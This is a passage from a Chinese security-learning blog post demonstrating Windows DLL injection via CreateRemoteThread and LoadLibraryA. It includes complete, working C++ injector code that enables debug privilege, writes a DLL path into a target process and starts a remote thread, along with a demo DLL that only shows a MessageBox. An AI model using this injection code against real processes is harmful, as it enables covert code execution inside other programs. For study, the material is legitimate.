<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,<span class="comment">//指定进程的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBaseAddress,<span class="comment">//指定写入内存的起始地址，先用virtualAllocex在目标进程中申请内存，然后写入dll文件路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,<span class="comment">//指定写入内容的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,<span class="comment">//写入内容长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesWritten<span class="comment">//接收实际写入内容长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="CloseHandle"><a href="#CloseHandle" class="headerlink" title="CloseHandle"></a>CloseHandle</h3><p>对打开的句柄进行关闭释放资源</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CloseHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hObject</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>恶意dll代码，功能为弹出MessageBox</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;Dll Injected&quot;</span>), _T(<span class="string">&quot;tips&quot;</span>), MB_OK);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>注入代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Tlhelp32.h.&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">//提升权限代码</span></span><br><span class="line"><span class="function">BOOL <span class="title">AdjustProcessTokenPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID luidTmp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = luidTmp;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="keyword">char</span>* szDllPathName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// #0.提升进程为DEBUG权限</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustProcessTokenPrivilege())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;提权失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取进程句柄</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OPENPROCESS Error ! \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//在目标进程分配内存并写入dll路径名</span></span><br><span class="line">    LPVOID lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VIRTUALALLOCEX Error !  \n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BOOL bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Error ! \n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取LoadLibraryA 函数地址</span></span><br><span class="line">    FARPROC dwLoadAddr = GetProcAddress(GetModuleHandle(_T(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!dwLoadAddr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error !\n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建远程线程,加载dll</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hThread)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreatRemoteTread Error !\n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LoadDll(<span class="number">25028</span>, (<span class="keyword">char</span>*)<span class="string">&quot;C:\\Users\\Administrator\\source\\repos\\Project8\\Project8\\DllTest.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>选择PID为25028的进程进行注入</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6018fc43f194b200017364cc"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/3aab9a86-5a38-46cd-8dff-81bf3eb4b27f.png" alt="imgbed.cn图床"></a></p>
<p>注入成功，弹出MessageBox</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6018fc39bd63390001d215f7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fcf08c29-2e1c-4d1f-982d-4fbf3c7e8d27.png" alt="imgbed.cn图床"></a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">上一页</a></div><div class="pagination-next"><a href="/page/3/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/5e0ca597-42d5-4a53-a683-2e0dd44f5952.jpg" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">26</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-05T05:38:50.000Z">2021-04-05</time></p><p class="title"><a href="/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">无列名注入总结</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-04T14:02:52.000Z">2021-04-04</time></p><p class="title"><a href="/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化复现</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-30T13:31:20.000Z">2021-03-30</time></p><p class="title"><a href="/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/">2020 新春红包题1</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-27T14:09:46.000Z">2021-03-27</time></p><p class="title"><a href="/2021/03/27/GYCTF2020-Easyphp/">GYCTF2020 Easyphp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-25T14:03:26.000Z">2021-03-25</time></p><p class="title"><a href="/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">phar反序列化学习</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>